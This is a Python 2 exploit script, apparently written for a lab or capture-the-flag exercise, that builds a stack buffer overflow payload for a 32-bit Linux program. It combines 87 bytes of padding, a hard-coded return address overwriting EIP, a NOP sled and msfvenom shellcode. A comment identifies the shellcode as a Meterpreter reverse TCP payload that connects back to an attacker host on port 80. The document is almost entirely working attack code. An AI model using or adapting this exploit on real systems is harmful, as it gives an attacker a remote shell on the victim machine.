import struct

eip_addr_1 = 0xbffff2b0
eip_addr_2 = 0xbffff310
eip_input_offset = 87


## Junk
junk = "A" * eip_input_offset


## EIP
target_addr = max(eip_addr_1, eip_addr_2) + 4
eip_value = struct.pack("<I", target_addr)


## NOP slide
slide_len = abs(eip_addr_1 - eip_addr_2)
NOP = "\x90" * slide_len


## Shellcode
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$KALI LPORT=80 -b "\x00" --smallest -f python
buf =  ""
buf += "\x6a\x7a\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e"
buf += "\x07\xe2\xfa\x6b\x08\x5d\x35\xde\xf1\xe4\x5b\x4a\x59"
buf += "\x61\x0e\xbd\x68\x86\xf1\xdc\x92\x84\x4f\x7d\x1c\x17"
buf += "\x1a\x16\x72\x19\x1c\x1d\x4e\x96\xc1\x4b\x44\x7b\x74"
buf += "\x74\x71\xae\xc9\x6a\xe7\xab\xa9\xed\x57\x36\x7e\x45"
buf += "\x0f\x5b\x96\x35\x36\x37\x60\x53\x3a\x51\x39\xb4\xdd"
buf += "\x0e\x89\x8c\xc2\xc6\x84\x3c\xfb\xac\x6f\xfb\x4d\xf2"
buf += "\x4c\x5d\x4e\x4f\xd9\xb2\x93\xb8\x58\x94\xb5\x5b\xe8"
buf += "\x24\x97\xdb\xd9\x9d\x26\x4f\x3b\xe8\x83\xfa\xd2\x69"
buf += "\xd6\x64\xa5\xe9\xef\xab\x14\x6f\x91\x8e\xc8\x70\x72"
buf += "\x73\x74\xce\x77\x77\x78\x79\xb7\xfb"


payload = junk + eip_value + NOP + buf
print payload
